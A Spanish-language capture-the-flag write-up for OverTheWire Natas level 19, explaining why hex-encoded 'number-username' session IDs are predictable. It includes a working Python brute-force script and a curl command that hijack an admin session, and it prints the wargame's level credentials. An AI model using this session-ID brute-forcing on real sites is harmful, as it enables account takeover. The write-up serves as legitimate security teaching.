# Natas Level19

## Descripción
> **Level Goal (natas19.natas.labs.overthewire.org):** "Usa mayormente el mismo código que el nivel anterior, pero los IDs de sesión ya no son secuenciales..." El código es casi idéntico al nivel 18, salvo que ahora `createID($user)` no solo sortea un número 1-640, sino que construye la cadena `"$idnum-$user"` y la codifica en hexadecimal (`bin2hex`) para usarla como `PHPSESSID`. `isValidID()` exige que el ID (una vez pasado por `strtolower`, y decodificado de hex) tenga la forma `numero-nombre`.

## Solución
El identificador ya no es "más aleatorio" en el sentido criptográfico: solo se le ha añadido una codificación reversible (hex) sobre exactamente los mismos datos que antes, con el añadido de que ahora **incluye el nombre de usuario en texto plano dentro del propio ID**. Esto en realidad **facilita** el ataque respecto al nivel 18: en vez de fuerza bruta "a ciegas" sobre 640 IDs esperando encontrar cualquier sesión con `admin=1`, se puede construir directamente cada candidato con el nombre de usuario `admin` y solo variar el número 1-640 — es decir, apuntar específicamente a las sesiones que un proceso de verificación automático del propio wargame crea al iniciar sesión internamente como usuario `admin` (aunque el formulario público tenga esa vía de login deshabilitada).

```python
import requests
from concurrent.futures import ThreadPoolExecutor

auth = ("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")
url = "http://natas19.natas.labs.overthewire.org/index.php"

def check(i):
    idstr = f"{i}-admin"
    hexid = idstr.encode().hex()
    r = requests.get(url, auth=auth, cookies={"PHPSESSID": hexid}, timeout=10)
    return (i, hexid) if "You are an admin" in r.text else None

with ThreadPoolExecutor(max_workers=20) as ex:
    found = [x for x in ex.map(check, range(1, 641)) if x]

print(found)  # [(281, '3238312d61646d696e')]
```

```bash
curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT \
  -b "PHPSESSID=3238312d61646d696e" \
  http://natas19.natas.labs.overthewire.org/index.php
# You are an admin. The credentials for the next level are:
# Username: natas20
# Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao
```

## Notas adicionales
- Que el ID de sesión contenga el nombre de usuario (aunque sea codificado en hexadecimal, una transformación completamente reversible y pública) es, en la práctica, peor que el esquema del nivel 18: reduce el ataque de "encontrar cualquier sesión admin entre 640 posibles" a "encontrar la sesión admin, que ya sabemos que existe con nombre `admin`, entre 640 posibles" — mismo tamaño de búsqueda, pero con un objetivo mucho más específico y con mayor probabilidad de encontrarse activo.
- Este nivel confirma la sospecha planteada en el writeup del [nivel 18](../level18/README.md): existe en el servidor algún proceso (probablemente un verificador automático de OTW) que sí inicia sesión como `admin` de verdad, generando sesiones con `admin=1` reales que quedan expuestas por tener un espacio de IDs demasiado pequeño — no dependía de que otro jugador humano tuviera casualmente una sesión admin.
- Codificar un dato en hexadecimal, base64 u otro formato no lo hace secreto ni impredecible; solo cambia su representación. La seguridad de un identificador de sesión depende de su entropía real, no de qué tan "raro" se vea.

## Referencias
- Reto original: http://natas19.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Session_fixation (OWASP, Session Fixation / predictable session IDs)
